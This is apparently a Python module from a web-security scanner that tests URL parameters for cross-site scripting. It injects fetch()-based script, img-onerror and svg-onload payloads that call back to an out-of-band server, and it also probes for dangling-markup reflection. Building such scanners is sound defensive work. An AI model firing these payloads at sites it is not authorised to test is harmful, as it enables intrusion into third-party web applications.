from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re

from .oob import OOBServer
from . import browser
from . import xss_pack


_ALERT_RE = re.compile(r"alert\s*\(\s*[^)]*\)")
_LEGACY_TEMPLATES = [
    "<script>fetch('{oob}')</script>",
    "\"><script>fetch('{oob}')</script>",
    "<img src=x onerror=\"fetch('{oob}')\">",
    "<svg onload=\"fetch('{oob}')\">",
]


def _with_param(url, param, value):
    parts = urlparse(url)
    q = parse_qs(parts.query)
    q[param] = [value]
    new_query = urlencode(q, doseq=True)
    return urlunparse(parts._replace(query=new_query))


def _inject_oob(payload, oob_url):
    if not payload:
        return payload
    if not _ALERT_RE.search(payload):
        return payload
    return _ALERT_RE.sub("fetch('%s')" % oob_url, payload)


def _probe_impl(target_url, param, oob_server=None, headers=None,
                cookies=None, engine_cfg=None, wait_timeout=4.0):
    local_oob = None
    if oob_server is None:
        try:
            from .oob_registry import get_shared_oob
            oob = get_shared_oob()
        except Exception:
            local_oob = OOBServer().start()
            oob = local_oob
    else:
        oob = oob_server
    out = {"target": target_url, "param": param, "oob_base": oob.base_url,
           "attempts": [], "callbacks": [], "result": None}
    try:
        for tmpl in _LEGACY_TEMPLATES:
            token, url = oob.payload_url()
            payload = tmpl.format(oob=url)
            test_url = _with_param(target_url, param, payload)
            r = browser.capture(test_url, headers=headers, cookies=cookies,
                                screenshot=False, engine_cfg=engine_cfg)
            attempt = {"token": token, "payload": tmpl,
                       "browser_error": r.get("error")}
            out["attempts"].append(attempt)
            if r.get("error") and str(r["error"]).startswith("ROE_BLOCK"):
                out["result"] = {"verdict": "UNKNOWN",
                                 "reason": r["error"], "evidence": {}}
                return out
            if oob.wait_for_hit(token, timeout=wait_timeout):
                out["callbacks"].append({"token": token, "payload": tmpl})
    finally:
        if local_oob is not None:
            local_oob.stop()

    if out["callbacks"]:
        payloads_seen = ", ".join(c["payload"] for c in out["callbacks"])
        out["result"] = {
            "verdict": "VULNERABLE",
            "reason": ("injected script executed in browser "
                       "(out-of-band callback) via: %s" % payloads_seen),
            "evidence": {"callbacks": out["callbacks"], "param": param},
        }
    elif getattr(oob, "is_external", False):
        out["result"] = {
            "verdict": "UNKNOWN",
            "reason": ("external OOB mode: cannot observe browser "
                       "callbacks locally; check the external "
                       "collaborator manually for hits"),
            "evidence": {"payloads_tried": len(out["attempts"]),
                         "oob_mode": "external"},
        }
    else:
        out["result"] = {
            "verdict": "PASS",
            "reason": "no payload executed in browser",
            "evidence": {"payloads_tried": len(out["attempts"])},
        }
    return out


def probe(*args, **kwargs):
    from .contract import make_result
    raw = _probe_impl(*args, **kwargs)
    return make_result(raw, capability="xss", args=args, kwargs=kwargs)


def analyze_reflection(prefix, suffix="", quote_char=None):
    return xss_pack.classify_context(prefix, suffix, quote_char)


def _probe_with_pack(target_url, param, ctx=None, waf=None, budget=None,
                     oob_server=None, headers=None, cookies=None,
                     engine_cfg=None, wait_timeout=4.0):
    local_oob = None
    if oob_server is None:
        try:
            from .oob_registry import get_shared_oob
            oob = get_shared_oob()
        except Exception:
            local_oob = OOBServer().start()
            oob = local_oob
    else:
        oob = oob_server
    out = {"target": target_url, "param": param, "context": ctx,
           "oob_base": oob.base_url, "attempts": [], "callbacks": [],
           "result": None}
    candidates = xss_pack.payloads_for_context(ctx or "html_body",
                                                 waf=waf, budget=budget)
    try:
        for payload in candidates:
            if not _ALERT_RE.search(payload):
                continue
            token, url = oob.payload_url()
            injected = _inject_oob(payload, url)
            test_url = _with_param(target_url, param, injected)
            r = browser.capture(test_url, headers=headers, cookies=cookies,
                                screenshot=False, engine_cfg=engine_cfg)
            out["attempts"].append({
                "token": token, "payload": payload, "injected": injected,
                "browser_error": r.get("error"),
            })
            if r.get("error") and str(r["error"]).startswith("ROE_BLOCK"):
                out["result"] = {"verdict": "UNKNOWN",
                                 "reason": r["error"], "evidence": {}}
                return out
            if oob.wait_for_hit(token, timeout=wait_timeout):
                out["callbacks"].append({"token": token, "payload": payload})
                break
    finally:
        if local_oob is not None:
            local_oob.stop()

    if out["callbacks"]:
        first = out["callbacks"][0]
        out["result"] = {
            "verdict": "VULNERABLE",
            "reason": ("context-aware XSS confirmed: %s"
                       % first["payload"][:80]),
            "evidence": {"callbacks": out["callbacks"], "param": param,
                         "context": out["context"]},
        }
    else:
        out["result"] = {
            "verdict": "PASS",
            "reason": "no payload executed in browser",
            "evidence": {"payloads_tried": len(out["attempts"]),
                         "context": out["context"]},
        }
    return out


def scan(target_url, param=None, context=None, waf=None, budget=None,
         oob_server=None, headers=None, cookies=None, engine_cfg=None,
         wait_timeout=4.0):
    from .contract import make_result
    if not param:
        return make_result(
            {"verdict": "UNKNOWN", "reason": "no param specified"},
            capability="xss", args=(target_url,))
    raw = _probe_with_pack(target_url, param, ctx=context, waf=waf,
                            budget=budget, oob_server=oob_server,
                            headers=headers, cookies=cookies,
                            engine_cfg=engine_cfg,
                            wait_timeout=wait_timeout)
    return make_result(raw, capability="xss", args=(target_url,))


def probe_dangling_markup(target_url, param, headers=None, engine_cfg=None):
    """Send a dangling-markup payload that breaks out of an attribute.

    Reports SUSPICIOUS when the payload marker appears in the response,
    PASS when it does not. In-page only — nothing is sent to an
    external listener.
    """
    from . import http as _http
    from .contract import make_result
    payload = '"<img src="//oob.listener/dangling-'
    url = _with_param(target_url, param, payload)
    try:
        with _http.Client(timeout=10, follow_redirects=True) as c:
            r = c.get(url, headers=headers or {})
        body = r.text or ""
        if "//oob.listener/dangling-" in body:
            return make_result({
                "verdict": "SUSPICIOUS",
                "reason": "dangling markup reflected into output",
                "evidence": {
                    "payload": payload,
                    "match_at": body.find("//oob.listener/dangling-"),
                },
            }, capability="xss", args=(target_url,))
    except Exception as e:
        return make_result({
            "verdict": "UNKNOWN",
            "reason": "%s: %s" % (type(e).__name__, e),
        }, capability="xss", args=(target_url,))
    return make_result({
        "verdict": "PASS",
        "reason": "no dangling markup reflection",
    }, capability="xss", args=(target_url,))
